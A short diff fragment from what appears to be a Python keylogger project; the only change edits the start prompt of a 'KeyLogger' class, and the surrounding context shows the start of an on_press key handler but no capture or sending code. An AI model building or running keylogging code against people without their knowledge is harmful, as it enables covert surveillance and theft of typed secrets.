@@ -5,7 +5,7 @@ class KeyLogger():
     def KeyLog(self,input_from_user):
         r=1
         while r==1:
-            a=input("Do you want to start Advance Keylogger (Y/N)")
+            a=input("Keylogger \nDo you want to start Advance Keylogger (Y/N)")
             if a=='Y':
                 print("The Keylogger has started")
                 def on_press(key):
